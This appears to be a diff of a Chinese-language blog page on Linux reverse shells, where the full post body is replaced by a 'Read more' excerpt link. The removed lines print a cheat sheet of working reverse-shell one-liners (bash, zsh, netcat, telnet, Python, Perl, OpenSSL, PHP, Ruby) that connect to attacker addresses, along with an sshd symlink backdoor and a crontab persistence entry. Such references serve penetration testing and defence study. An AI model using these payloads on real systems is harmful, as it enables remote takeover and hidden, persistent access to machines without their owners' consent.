@@ -176,7 +176,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2021-12-21 13:14:37 / Modified: 15:07:07" itemprop="dateCreated datePublished" datetime="2021-12-21T13:14:37+08:00">2021-12-21</time>
+              <time title="Created: 2021-12-21 13:14:37 / Modified: 15:08:04" itemprop="dateCreated datePublished" datetime="2021-12-21T13:14:37+08:00">2021-12-21</time>
             </span>
 
           
@@ -194,61 +194,14 @@
 <p>桃李春风一杯酒，江湖夜雨十年灯。</p>
 </blockquote>
 <p>常见的一些linux反弹shell总结</p>
-<h2 id="bash反弹"><a href="#bash反弹" class="headerlink" title="bash反弹"></a>bash反弹</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">靶机：</span><br><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/172.16.42.1/</span><span class="number">44044</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">非bash环境：<span class="regexp">/bin/</span>bash -c <span class="string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/172.16.42.1/44044 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="zsh反弹"><a href="#zsh反弹" class="headerlink" title="zsh反弹"></a>zsh反弹</h2><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机：zsh -c <span class="string">&#x27;zmodload zsh/net/tcp &amp;&amp; ztcp 172.16.42.1 44044 &amp;&amp; zsh &gt;&amp;<span class="subst">$REPLY</span> 2&gt;&amp;<span class="subst">$REPLY</span> 0&gt;&amp;<span class="subst">$REPLY</span>&#x27;</span></span><br><span class="line">攻击机：nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="nc反弹"><a href="#nc反弹" class="headerlink" title="nc反弹"></a>nc反弹</h2> <figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机：netcat <span class="number">172.16</span>.<span class="number">42.1</span> <span class="number">44044</span> -e <span class="regexp">/bin/</span>bash</span><br><span class="line">攻击机：nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="nc正向反弹"><a href="#nc正向反弹" class="headerlink" title="nc正向反弹"></a>nc正向反弹</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机：nc -lvp <span class="number">7777</span> -e <span class="regexp">/bin/</span>bash</span><br><span class="line">攻击机：nc <span class="number">172.16</span>.<span class="number">43.1</span> <span class="number">7777</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="telnet反弹"><a href="#telnet反弹" class="headerlink" title="telnet反弹"></a>telnet反弹</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机: mknod <span class="keyword">a</span> p; telnet <span class="number">172.16</span><span class="number">.42</span><span class="number">.1</span> <span class="number">44044</span> <span class="number">0</span>&lt;<span class="keyword">a</span> | /bin/bash <span class="number">1</span>&gt;<span class="keyword">a</span></span><br><span class="line">攻击机：nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="python反弹"><a href="#python反弹" class="headerlink" title="python反弹"></a>python反弹</h2><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">靶机：</span><br><span class="line">python -c &#x27;import <span class="keyword">socket</span>,subprocess,os;s=<span class="keyword">socket</span>.<span class="keyword">socket</span>(<span class="keyword">socket</span>.AF_INET,<span class="keyword">socket</span>.SOCK_STREAM);s.connect((<span class="string">&quot;172.16.42.1&quot;</span>,<span class="number">44044</span>));os.dup2(s.fileno(),<span class="number">0</span>); os.dup2(s.fileno(),<span class="number">1</span>); os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>]);&#x27;</span><br><span class="line"></span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="perl反弹"><a href="#perl反弹" class="headerlink" title="perl反弹"></a>perl反弹</h2><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">靶机：</span><br><span class="line">perl -e &#x27;use Socket;<span class="variable">$i</span>=<span class="string">&quot;172.16.42.1&quot;</span>;<span class="variable">$p</span>=<span class="number">44044</span>;<span class="keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="string">&quot;tcp&quot;</span>));<span class="keyword">if</span>(connect(S,sockaddr_in(<span class="variable">$p</span>,inet_aton(<span class="variable">$i</span>))))&#123;<span class="keyword">open</span>(STDIN,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDOUT,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">open</span>(STDERR,<span class="string">&quot;&gt;&amp;S&quot;</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/sh -i&quot;</span>);&#125;;&#x27;</span><br><span class="line"></span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="open-ssh-反弹"><a href="#open-ssh-反弹" class="headerlink" title="open ssh 反弹"></a>open ssh 反弹</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">靶机：</span><br><span class="line">mkfifo <span class="regexp">/tmp/</span>s; <span class="regexp">/bin/</span>sh -i &lt; <span class="regexp">/tmp/</span>s <span class="number">2</span>&gt;&amp;<span class="number">1</span> | openssl s_client -quiet -connect <span class="number">172.16</span>.<span class="number">42.150</span>:<span class="number">2333</span> &gt; <span class="regexp">/tmp/</span>s; rm <span class="regexp">/tmp/</span>s</span><br><span class="line"></span><br><span class="line">攻击机：</span><br><span class="line">openssl req -x509 -newkey rsa:<span class="number">2048</span> -keyout key.pem -out cert.pem -days <span class="number">365</span> -nodes</span><br><span class="line">openssl s_server -quiet -key key.pem -cert cert.pem -port <span class="number">2333</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="SSH反弹"><a href="#SSH反弹" class="headerlink" title="SSH反弹"></a>SSH反弹</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">靶机：</span><br><span class="line">ln -sf <span class="regexp">/usr/</span>sbin<span class="regexp">/sshd /</span>tmp<span class="regexp">/su;/</span>tmp/su -oPort=<span class="number">8080</span>;</span><br><span class="line">攻击机：</span><br><span class="line">ssh root@<span class="number">172.16</span>.<span class="number">42.146</span> -p <span class="number">8080</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">靶机：</span><br><span class="line">(crontab -l;printf <span class="string">&quot;* * * * *  /usr/bin/python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="subst">\&quot;</span>172.16.42.146<span class="subst">\&quot;</span>,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([<span class="subst">\&quot;</span>/bin/sh<span class="subst">\&quot;</span>,<span class="subst">\&quot;</span>-i<span class="subst">\&quot;</span>]);&#x27;<span class="subst">\n</span>&quot;</span>)|crontab -</span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">8080</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">靶机：</span><br><span class="line">php -r &#x27;<span class="variable">$sock</span>=fsockopen(<span class="string">&quot;172.16.42.146&quot;</span>,<span class="number">8080</span>);<span class="keyword">exec</span>(<span class="string">&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);&#x27;</span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">8080</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">靶机：</span><br><span class="line">ruby -rsocket -e &#x27;exit <span class="keyword">if</span> fork;c=<span class="module-access"><span class="module"><span class="identifier">TCPSocket</span>.</span></span><span class="keyword">new</span>(<span class="string">&quot;172.16.42.146&quot;</span>,<span class="string">&quot;8080&quot;</span>);<span class="keyword">while</span>(cmd=c.gets);<span class="module-access"><span class="module"><span class="identifier">IO</span>.</span></span>popen(cmd,<span class="string">&quot;r&quot;</span>)&#123;<span class="pattern-match">|io|c.print io.read&#125;<span class="keyword">end</span>&#x27;</span></span><br><span class="line"><span class="pattern-match">攻击机：</span></span><br><span class="line"><span class="pattern-match">nc -lvvp 8080</span></span><br></pre></td></tr></table></figure>
-
-
-
-
-
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://jkme.github.io/pages/reverse-shell.html">https://jkme.github.io/pages/reverse-shell.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://ninjia.gitbook.io/secskill/net/shell#php">https://ninjia.gitbook.io/secskill/net/shell#php</a></p>
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/linux%E4%B8%8B%E5%8F%8D%E5%BC%B9shell/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
